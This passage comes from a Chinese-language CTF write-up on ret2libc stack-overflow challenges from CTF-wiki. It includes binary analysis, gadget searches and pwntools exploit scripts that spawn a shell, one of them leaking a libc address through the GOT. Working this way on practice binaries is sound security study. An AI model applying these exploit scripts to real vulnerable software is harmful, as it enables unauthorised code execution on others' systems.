</span>|<br>                                           |<span class="hljs-string">     108位       </span>|<br>                                           |<span class="hljs-string">                 </span>|<br>                                           |<span class="hljs-string">                 </span>|<br>                                     v4---&gt;+-----------------+<br></code></pre></td></tr></table></figure><h2 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>sh = process(<span class="hljs-string">&#x27;./ret2libc1&#x27;</span>)<br><br>binsh_addr = <span class="hljs-number">0x8048720</span><br>system_plt = <span class="hljs-number">0x08048460</span><br>payload = flat([<span class="hljs-string">&#x27;A&#x27;</span> * <span class="hljs-number">108</span>, <span class="hljs-string">&#x27;B&#x27;</span> * <span class="hljs-number">4</span>, system_plt, <span class="hljs-string">&#x27;b&#x27;</span> * <span class="hljs-number">4</span>, binsh_addr])<br>sh.sendline(payload)<br><br>sh.interactive()<br><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">[root@ningan ret2libc1]# python exp.py</span><br><span class="hljs-string">[+] Starting local process &#x27;./ret2libc1&#x27;: pid 738</span><br><span class="hljs-string">[*] Switching to interactive mode</span><br><span class="hljs-string">RET2LIBC &gt;_&lt;</span><br><span class="hljs-string">$ ls</span><br><span class="hljs-string">exp.py    ret2libc1</span><br><span class="hljs-string"></span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></td></tr></table></figure><h1 id="ret2libc2"><a href="#ret2libc2" class="headerlink" title="ret2libc2"></a>ret2libc2</h1><h2 id="检查-2"><a href="#检查-2" class="headerlink" title="检查"></a>检查</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ningan ret2libc2]<span class="hljs-comment"># file ret2libc2</span><br>ret2libc2: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, <span class="hljs-keyword">for</span> GNU/Linux 2.6.24, BuildID[sha1]=83535a471d9ef90c3d5ff7f077944fb6021787a1, with debug_info, not stripped<br>[root@ningan ret2libc2]<span class="hljs-comment">#</span><br>[root@ningan ret2libc2]<span class="hljs-comment"># checksec ret2libc2</span><br>[!] Could not populate PLT: future feature annotations is not defined (unicorn.py, line 2)<br>[*] <span class="hljs-string">&#x27;/root/ctf/ctfwiki/ret2libc2/ret2libc2&#x27;</span><br>    Arch:     i386-32-little<br>    RELRO:    Partial RELRO<br>    Stack:    No canary found<br>    NX:       NX enabled<br>    PIE:      No PIE (0x8048000)<br><br></code></pre></td></tr></table></figure><h2 id="ida分析-3"><a href="#ida分析-3" class="headerlink" title="ida分析"></a>ida分析</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  <span class="hljs-type">char</span> s[<span class="hljs-number">100</span>]; <span class="hljs-comment">// [esp+1Ch] [ebp-64h] BYREF</span><br><br>  setvbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>);<br>  setvbuf(_bss_start, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Something surprise here, but I don&#x27;t think it will work.&quot;</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;What do you think ?&quot;</span>);<br>  gets(s);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230822165237.png" alt="image.png"></p><p>可以看到，有system的plt函数，如上图；但是没有&#x2F;bin&#x2F;sh字符串，如下图</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230822165309.png" alt="image.png"></p><h2 id="ROPgadget分析-1"><a href="#ROPgadget分析-1" class="headerlink" title="ROPgadget分析"></a>ROPgadget分析</h2><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230822165352.png" alt="image.png"></p><p>这个工具也看到没有&#x2F;bin&#x2F;sh字符串</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230822165433.png" alt="image.png"></p><h2 id="查看bss是否可以写入"><a href="#查看bss是否可以写入" class="headerlink" title="查看bss是否可以写入"></a>查看bss是否可以写入</h2><h3 id="ida分析-4"><a href="#ida分析-4" class="headerlink" title="ida分析"></a>ida分析</h3><p>bss段的大概位置为：0804A040-&gt;0804A040，并且0x0804A040处有一个可以写入的地方(buf2变量)</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230829232552.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230829234320.png" alt="image.png"></p><p>get函数的地址为：0x08048460 </p><h3 id="gdb分析-2"><a href="#gdb分析-2" class="headerlink" title="gdb分析"></a>gdb分析</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs css">gdb   ret2libc2<br><span class="hljs-selector-tag">b</span> <span class="hljs-selector-tag">main</span><br>r<br>vmmap<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230829232512.png" alt="image.png"><br>可以看到，bss段是可写的</p><h3 id="ROPgadget分析-2"><a href="#ROPgadget分析-2" class="headerlink" title="ROPgadget分析"></a>ROPgadget分析</h3><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230829234048.png" alt="image.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ningan ret2libc2]<span class="hljs-comment"># ROPgadget --binary ret2libc2  --only &#x27;pop|ret&#x27; | grep &#x27;eax&#x27;</span><br>[root@ningan ret2libc2]<span class="hljs-comment">#</span><br>[root@ningan ret2libc2]<span class="hljs-comment">#</span><br>[root@ningan ret2libc2]<span class="hljs-comment"># ROPgadget --binary ret2libc2  --only &#x27;pop|ret&#x27; | grep &#x27;ebx&#x27;</span><br>0x0804872c : pop ebx ; pop esi ; pop edi ; pop ebp ; ret<br>0x0804843d : pop ebx ; ret<br>[root@ningan ret2libc2]<span class="hljs-comment"># ROPgadget --binary ret2libc2  --only &#x27;pop|ret&#x27; | grep &#x27;ecx&#x27;</span><br>[root@ningan ret2libc2]<span class="hljs-comment"># ROPgadget --binary ret2libc2  --only &#x27;pop|ret&#x27; | grep &#x27;edx&#x27;</span><br><br></code></pre></td></tr></table></figure><p>拿到pop_ebx_ret的地址为：0x0804843d</p><h2 id="！！！重点思路！！！"><a href="#！！！重点思路！！！" class="headerlink" title="！！！重点思路！！！"></a>！！！重点思路！！！</h2><p>代码中直接有system的plt地址，但是没有&#x2F;bin&#x2F;sh字符串<br>这里就可以调用get函数来让我们输入&#x2F;bin&#x2F;sh 然后在让system返回到我们输入的地方<br>哪里可以输入呢？查找bss段是否有可以输入的地方<br>发现bss段有一个buf变量，而且bss段是可写的<br>调用get函数写一个&#x2F;bin&#x2F;sh进去，把这个写进去的字符串当成system的函数来执行即可~</p><h2 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p=process(<span class="hljs-string">&#x27;./ret2libc2&#x27;</span>)<br>get_add=<span class="hljs-number">0x08048460</span><br>sys_add=<span class="hljs-number">0x08048490</span><br>buf2_add=<span class="hljs-number">0x0804A080</span><br>payload=flat([<span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">112</span>,get_add,sys_add,buf2_add,buf2_add])<br>p.sendline(payload)<br>p.sendline(<span class="hljs-string">&#x27;/bin/sh&#x27;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230831194630.png" alt="image.png"></p><h2 id="exp2"><a href="#exp2" class="headerlink" title="exp2"></a>exp2</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">##!/usr/bin/env python</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>sh = process(<span class="hljs-string">&#x27;./ret2libc2&#x27;</span>)<br><br>gets_plt = <span class="hljs-number">0x08048460</span><br>system_plt = <span class="hljs-number">0x08048490</span><br>pop_ebx = <span class="hljs-number">0x0804843d</span><br>buf2 = <span class="hljs-number">0x804a080</span><br>payload = flat(<br>    [<span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">112</span>, gets_plt, pop_ebx, buf2, system_plt, <span class="hljs-number">0xdeadbeef</span>, buf2])<br>sh.sendline(payload)<br>sh.sendline(<span class="hljs-string">&#x27;/bin/sh&#x27;</span>)<br>sh.interactive()<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230831194653.png" alt="image.png"></p><h2 id="参考-1"><a href="#参考-1" class="headerlink" title="参考"></a>参考</h2><p><a href="https://blog.csdn.net/m0_64180167/article/details/130263518?spm=1001.2101.3001.6650.2&utm_medium=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~Rate-2-130263518-blog-122848031.235%5Ev38%5Epc_relevant_anti_vip_base&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~Rate-2-130263518-blog-122848031.235%5Ev38%5Epc_relevant_anti_vip_base&utm_relevant_index=3"># CTFWIKI-PWN-ret2libc</a> 讲的非常详细</p><h1 id="ret2libc3"><a href="#ret2libc3" class="headerlink" title="ret2libc3"></a>ret2libc3</h1><h2 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ningan ret2libc3]<span class="hljs-comment"># file ret2libc3</span><br>ret2libc3: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, <span class="hljs-keyword">for</span> GNU/Linux 2.6.24, BuildID[sha1]=c0ad441ebd58b907740c1919460c37bb99bb65df, with debug_info, not stripped<br>[root@ningan ret2libc3]<span class="hljs-comment">#</span><br>[root@ningan ret2libc3]<span class="hljs-comment"># checksec ret2libc3</span><br>[!] Could not populate PLT: future feature annotations is not defined (unicorn.py, line 2)<br>[*] <span class="hljs-string">&#x27;/root/ctf/ctfwiki/ret2libc3/ret2libc3&#x27;</span><br>    Arch:     i386-32-little<br>    RELRO:    Partial RELRO<br>    Stack:    No canary found<br>    NX:       NX enabled<br>    PIE:      No PIE (0x8048000)<br>[root@ningan ret2libc3]<span class="hljs-comment"># ./ret2libc3</span><br>No surprise anymore, system disappeard QQ.<br>Can you find it !?1234<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230829220442.png" alt="image.png"></p><p>圈住的为自己输入的内容</p><h2 id="找漏洞函数"><a href="#找漏洞函数" class="headerlink" title="找漏洞函数"></a>找漏洞函数</h2><p>进入到ida中，查看main函数，发现gets函数有溢出</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  <span class="hljs-type">char</span> s[<span class="hljs-number">100</span>]; <span class="hljs-comment">// [esp+1Ch] [ebp-64h] BYREF</span><br><br>  setvbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>);<br>  setvbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;No surprise anymore, system disappeard QQ.&quot;</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Can you find it !?&quot;</span>);<br>  gets(s);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230831103259.png" alt="image.png"></p><h2 id="找system函数-没找见"><a href="#找system函数-没找见" class="headerlink" title="找system函数-没找见"></a>找system函数-没找见</h2><p>上图可以看到，没有system函数</p><p>进到pwndbg中，也可以看到没有system函数<br>（此处可以以puts函数为对比，看到上图ida中puts函数的地址为0x08048460，看到下图pwndbg中puts函数的地址也为0x08048460）</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">pwndbg&gt; <span class="hljs-keyword">info</span> <span class="hljs-keyword">function</span> puts<br>pwndbg&gt; <span class="hljs-keyword">info</span> <span class="hljs-keyword">function</span> <span class="hljs-keyword">system</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230831105717.png" alt="image.png"></p><h2 id="找-x2F-bin-x2F-sh字符串-没找见"><a href="#找-x2F-bin-x2F-sh字符串-没找见" class="headerlink" title="找&#x2F;bin&#x2F;sh字符串-没找见"></a>找&#x2F;bin&#x2F;sh字符串-没找见</h2><p>ida中找：<br>ida操作：shift+F12    找到字符串<br>也没有&#x2F;bin&#x2F;sh字符串</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230831103643.png" alt="image.png"></p><p>ROPgadget操作：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~/ctfwiki/ret2libc3]<br>└─<span class="hljs-comment"># ROPgadget --binary ret2libc3 --string &#x27;/bin/sh&#x27;</span><br>Strings information<br>============================================================<br><br>┌──(root㉿kali)-[~/ctfwiki/ret2libc3]<br>└─<span class="hljs-comment"># ROPgadget --binary ret2libc3 --string &#x27;sh&#x27;</span><br>Strings information<br>============================================================<br>0x08048736 : sh<br><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230831110341.png" alt="image.png"></p><p>上面看到，没有&#x2F;bin&#x2F;sh，有一个sh。<br>那这个sh能否利用呢？<br>看到sh的地址为：0x0x08048736，到ida中分析查看，找到了这个sh指的是no_shell-QQ中的sh，所以是不能利用的</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-class">.rodata</span>:<span class="hljs-number">08048733</span>                               ; const char s<span class="hljs-selector-attr">[]</span><br><span class="hljs-selector-class">.rodata</span>:<span class="hljs-number">08048733</span> <span class="hljs-number">6</span>E <span class="hljs-number">6</span>F <span class="hljs-number">5</span>F <span class="hljs-number">73</span> <span class="hljs-number">68</span> <span class="hljs-number">65</span> <span class="hljs-number">6</span>C <span class="hljs-number">6</span>C <span class="hljs-number">5</span>F <span class="hljs-number">51</span>+s db <span class="hljs-string">&#x27;no_shell_QQ&#x27;</span>,<span class="hljs-number">0</span>                    ; DATA XREF: secure+<span class="hljs-number">3</span>D↑o<br>.rodata:<span class="hljs-number">0804873</span>F <span class="hljs-number">00</span>                            align <span class="hljs-number">10</span>h<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230831110657.png" alt="image.png"></p><h2 id="解题思路-3"><a href="#解题思路-3" class="headerlink" title="解题思路"></a>解题思路</h2><p>通过泄露libc的地址，来计算system的地址和&#x2F;bin&#x2F;sh的地址</p><p>如何得到 libc 中的某个函数的地址呢？我们一般常用的方法是采用 got 表泄露，即输出某个函数对应的 got 表项的内容。<strong>当然，由于 libc 的延迟绑定机制，我们需要泄漏已经执行过的函数的地址。</strong>已经执行过的话就会在got表生存下来，有了真实的地址！</p><p>(解法1) 可以泄露puts函数，puts函数已经执行过了。基本利用思路如下：</p><ul><li>泄露puts函数地址</li><li>获取 libc 版本</li><li>获取 system 地址与 &#x2F;bin&#x2F;sh 的地址</li><li>再次执行源程序</li><li>触发栈溢出执行 system(‘&#x2F;bin&#x2F;sh’)</li></ul><h2 id="exp：泄露puts函数的真实地址"><a href="#exp：泄露puts函数的真实地址" class="headerlink" title="exp：泄露puts函数的真实地址"></a>exp：泄露puts函数的真实地址</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 导入 pwntools 库，这是一个用于二进制漏洞利用的强大工具库。</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment"># 导入 LibcSearcher，这是一个用于从函数地址中搜索libc版本和提取libc函数地址的工具。</span><br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> * <br><br><span class="hljs-comment"># 创建一个新的进程，执行名为 ret2libc3 的可执行文件。这将用于在本地系统上执行漏洞利用。</span><br>io = process(<span class="hljs-string">&quot;./ret2libc3&quot;</span>)<br><span class="hljs-comment"># 将 ret2libc3 可执行文件加载到 elf 对象中，以便从中获取有关程序结构的信息，例如函数地址和GOT地址。</span><br>elf = ELF(<span class="hljs-string">&quot;./ret2libc3&quot;</span>)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;=== 通过泄露 puts 函数的地址 ===&quot;</span>)<br><span class="hljs-comment"># 获取 puts 函数的 PLT（Procedure Linkage Table）地址和 GOT（Global Offset Table）地址。</span><br>puts_plt = elf.plt[<span class="hljs-string">&quot;puts&quot;</span>]<br>puts_got = elf.got[<span class="hljs-string">&quot;puts&quot;</span>]<br><span class="hljs-comment"># 获取程序的 _start 符号的地址，这通常是程序的入口点。</span><br>start_addr=elf.symbols[<span class="hljs-string">&#x27;_start&#x27;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;puts_plt: &quot;</span>, puts_plt)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;hex(puts_plt): &quot;</span>, <span class="hljs-built_in">hex</span>(puts_plt))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;puts_got: &quot;</span>, puts_got)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;hex(puts_got): &quot;</span>, <span class="hljs-built_in">hex</span>(puts_got))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;start_addr: &quot;</span>, start_addr)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;hex(start_addr): &quot;</span>, <span class="hljs-built_in">hex</span>(start_addr))<br><span class="hljs-comment"># 构建一个 payload，其中包括 112 个字节的填充（用于填充到返回地址之前），然后是 puts 函数的 PLT 地址、程序入口点地址和 puts 函数的 GOT 地址。这将在程序中触发漏洞。</span><br>payload1 = flat([<span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">112</span>,puts_plt,start_addr,puts_got])<br><span class="hljs-comment"># payload1 = b&#x27;A&#x27;*108 + b&#x27;BBBB&#x27; + puts_plt + start + puts_got  # 报错：TypeError: can&#x27;t concat int to bytes</span><br><span class="hljs-comment"># payload1 = b&#x27;A&#x27;*108 + b&#x27;BBBB&#x27; + p32(puts_plt) + p32(start) + p32(puts_got) # 正确写法</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;payload1: &quot;</span>, payload1)<br><span class="hljs-comment"># 发送构建好的 payload1 到程序。</span><br>io.sendlineafter(<span class="hljs-string">&#x27;!?&#x27;</span>,payload1)<br><span class="hljs-comment"># 接收从程序中泄露的 puts 函数的地址，并将其转换为整数。这将帮助确定libc的基址。</span><br><span class="hljs-comment"># io.recv(4)接受程序返回的二进制 大小为4字节  u32()为保存为无符号的32位</span><br>puts_addr_raw = io.recv(<span class="hljs-number">4</span>)<br>puts_addr = u32(puts_addr_raw) <br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;puts_addr_raw: &quot;</span>, puts_addr_raw)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;puts_addr: &quot;</span>, puts_addr)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;hex(puts_addr): &quot;</span>, <span class="hljs-built_in">hex</span>(puts_addr))<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;=== 计算libc的基址，然后获取 system 函数地址和 /bin/sh 字符串地址 ===&quot;</span>)<br><span class="hljs-comment"># 使用 LibcSearcher 工具，根据泄露的 puts 函数地址来搜索libc库并提取相关信息。</span><br>libc = LibcSearcher(<span class="hljs-string">&#x27;puts&#x27;</span>,puts_addr)<br><span class="hljs-comment"># 计算libc的基址，这是通过从 puts 函数地址中减去 puts 在libc中的偏移得到的。</span><br>base = puts_addr-libc.dump(<span class="hljs-string">&#x27;puts&#x27;</span>)<br><span class="hljs-comment"># 计算 system 函数和 /bin/sh 字符串的地址，这将用于后续的漏洞利用。</span><br>system_addr = base+libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br>bin_addr=base+libc.dump(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>)<br><span class="hljs-comment"># 构建第二个 payload，其中包括 112 个字节的填充，然后是计算得到的 system 函数地址、随意的返回地址（1234），以及计算得到的 /bin/sh 字符串地址。</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;hex(base): &quot;</span>, <span class="hljs-built_in">hex</span>(base))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;hex(system_addr): &quot;</span>, <span class="hljs-built_in">hex</span>(system_addr))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;hex(bin_addr): &quot;</span>, <span class="hljs-built_in">hex</span>(bin_addr))<br>payload2 = flat([<span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">112</span>,system_addr,<span class="hljs-number">1234</span>,bin_addr])<br><span class="hljs-comment"># 使用p32函数将整数转换为对应的4字节二进制字符串</span><br><span class="hljs-comment"># payload2 = b&#x27;A&#x27;*108 + b&#x27;BBBB&#x27; + p32(system_addr) + b&#x27;0xdeadbeaf&#x27; + p32(sh_addr) # 错误写法</span><br><span class="hljs-comment"># payload2 = b&#x27;A&#x27;*108 + b&#x27;BBBB&#x27; + p32(system_addr) + p32(0xdeadbeaf) + p32(sh_addr) # 正确写法</span><br><span class="hljs-comment"># payload2 = b&#x27;A&#x27;*108 + b&#x27;BBBB&#x27; + p32(system_addr) + b&#x27;\x0f\x0b\x0f\x0b&#x27; + p32(sh_addr) # 正确写法</span><br><span class="hljs-comment"># payload2 = b&#x27;A&#x27;*108 + b&#x27;BBBB&#x27; + p32(system_addr) + b&#x27;1234&#x27; + p32(sh_addr) # 正确写法</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;payload2: &quot;</span>, payload2)<br><span class="hljs-comment"># 发送构建好的 payload2 到程序，触发第二阶段的漏洞利用，旨在获取系统 Shell。</span><br>io.sendlineafter(<span class="hljs-string">&#x27;!?&#x27;</span>,payload2)<br><span class="hljs-comment"># 与程序进行交互，获取系统 Shell，进入交互式命令模式。</span><br>io.interactive()<br><br>                                                                                                                                                                       <span class="hljs-string">&quot;&quot;&quot;                                                            </span><br><span class="hljs-string">┌──(root㉿kali)-[~/ctfwiki/ret2libc3]</span><br><span class="hljs-string">└─# python exp.py      </span><br><span class="hljs-string">[+] Starting local process &#x27;./ret2libc3&#x27;: pid 18449</span><br><span class="hljs-string">[*] &#x27;/root/ctfwiki/ret2libc3/ret2libc3&#x27;</span><br><span class="hljs-string">    Arch:     i386-32-little</span><br><span class="hljs-string">    RELRO:    Partial RELRO</span><br><span class="hljs-string">    Stack:    No canary found</span><br><span class="hljs-string">    NX:       NX enabled</span><br><span class="hljs-string">    PIE:      No PIE (0x8048000)</span><br><span class="hljs-string">=== 通过泄露 puts 函数的地址 ===</span><br><span class="hljs-string">puts_plt:  134513760</span><br><span class="hljs-string">hex(puts_plt):  0x8048460</span><br><span class="hljs-string">puts_got:  134520856</span><br><span class="hljs-string">hex(puts_got):  0x804a018</span><br><span class="hljs-string">start_addr:  134513872</span><br><span class="hljs-string">hex(start_addr):  0x80484d0</span><br><span class="hljs-string">payload1:  